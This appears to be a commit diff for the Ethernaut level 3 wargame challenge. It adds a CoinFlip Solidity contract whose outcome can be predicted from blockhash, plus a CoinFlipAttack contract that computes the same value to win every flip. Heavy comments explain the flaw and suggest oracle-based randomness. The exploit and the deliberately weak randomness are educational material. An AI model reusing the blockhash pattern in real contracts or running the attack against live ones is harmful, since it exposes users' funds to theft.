1f8ea908ff2479c54af2ac201891c07d66eca952
Remix Workspace <>
2022-05-02 14:48:26 -0600

    Ethernaut level 3

---
+++ contracts/CoinFlip.sol
@@ -0,0 +1,70 @@
+// SPDX-License-Identifier: MIT
+/* 
+use locked pragma for production to avoid SWC-103
+floating pragma i.e. ^0.8.4, using a locked pragma that
+has been thoroughly tested with the contract ensures
+that contracts do not accidentally get deployed using, for example, 
+an outdated compiler version that might introduce bugs that affect 
+the contract system negatively
+*/
+pragma solidity ^0.5.0; // floating pragma SWC-103, use fixed version for production i.e. 0.5.0
+
+// outdated import for SafeMath, pragma 0.8.0 has SafeMath included in version
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/math/SafeMath.sol";
+
+/// @title Ethernaut challenge 3, guess correct side 10 times in a row
+/// @author Kyle Riley
+contract CoinFlip {
+
+  // state variable of integers type, imported from openzeppelin
+  using SafeMath for uint256; 
+  // state variable assigned in constructor 
+  uint256 public consecutiveWins; 
+  // state variable assigned in function flip()
+  uint256 lastHash; 
+  // state variable assigned in function flip()
+  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+  /// @notice constructor sets wins to zero
+  constructor() public {
+    consecutiveWins = 0;
+  }
+
+  /// @notice function flip() exported to attack contract 
+  function flip(bool _guess) public returns (bool) {
+    /** custom:notice blockhash and block.number are globally accessible variables available to everyone 
+    this is the source of randomness and can be exploited in the attack to calculate the correct side of the coin flip
+    best practice to introduce a source of randomness into a contract would be to use a decentralized oracle to compute 
+    random numbers, because there is no native way to generate random numbers in Solidity and everything is
+    publicly visible in the contract */ 
+    /* local variable blockValue is assigned 
+    using the uint256 integer from the hash of the last block number */
+    uint256 blockValue = uint256(blockhash(block.number.sub(1))); 
+
+    // ensures lastHash is a unique value, if not, it will revert transaction
+    if (lastHash == blockValue) {
+      revert();
+    }
+
+    /* if lastHash is found to be unique state variable lastHash 
+    is assigned as the local variable blockValue */
+    lastHash = blockValue; 
+    /** @custom:notice local variable coinFlip assigned using the local variable blockValue 
+    divided by the state variable FACTOR */
+    uint256 coinFlip = blockValue.div(FACTOR); 
+    /** @custom:notice local variable side is assigned as a correct _guess if 
+    coinFlip is equal to 1 and is declared as true */ 
+    bool side = coinFlip == 1 ? true : false;
+
+    /* if side is equal to true it is entered as a correct _guess and consecutiveWins 
+    is incremented by 1 and returns true */
+    if (side == _guess) {
+      consecutiveWins++;
+      return true;
+    // if side is not equal to true, consecutiveWins is set to zero, returns false
+    } else {
+      consecutiveWins = 0;
+      return false;
+    }
+  }
+}
---
+++ contracts/CoinFlipAttack.sol
@@ -0,0 +1,45 @@
+// SPDX-License-Identifier: MIT
+// fixed pragma
+pragma solidity 0.5.0; 
+
+import "./CoinFlip.sol";
+// outdated import for SafeMath, pragma 0.8.0 has SafeMath included in version
+import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/math/SafeMath.sol";
+
+/// @title attack contract, calculates correct side 10 times in a row
+/// @author Web3 Blockchain Developer 
+contract CoinFlipAttack {
+    /// @notice public state variable assigned in constructor
+    CoinFlip public victimContract; 
+    
+    // state variable assigned in function flip()
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    
+    /** @notice victim address belonging to CoinFlip assigned as public state variable victimContract 
+    during deployment of attack contract */
+    constructor(address _victimContractAddr) public {
+        victimContract = CoinFlip(_victimContractAddr);
+    }
+
+    /// @notice function flip() inherited from CoinFlip import
+    function flip() public returns(bool) {
+        /** custom:notice blockhash and block.number are globally accessible variables available to everyone 
+        this is the source of randomness and can be exploited in the attack to calculate the correct side of the coin flip
+        best practice to introduce a source of randomness into a contract would be to use a decentralized oracle to compute 
+        random numbers, because there is no native way to generate random numbers in Solidity and everything is
+        publicly visible in the contract */ 
+        /* local variable blockValue is assigned 
+        using the uint256 integer from the hash of the last block number */ 
+        uint256 blockValue = uint256(blockhash(block.number -1));
+        /** @custom:notice local variable coinFlip assigned using the local variable blockValue 
+        divided by the state variable FACTOR */
+        uint256 coinFlip = uint256(blockValue/FACTOR);
+        /** @custom:notice local variable side is assigned as a correct _guess if 
+        coinFlip is equal to 1 and is declared as true */
+        bool side = coinFlip == 1 ? true : false;
+
+        /** @custom:notice player calls function flip() inherited from victim contract 
+        and entered as correct guess side every flip to complete this level! */
+        victimContract.flip(side);
+    }
+}
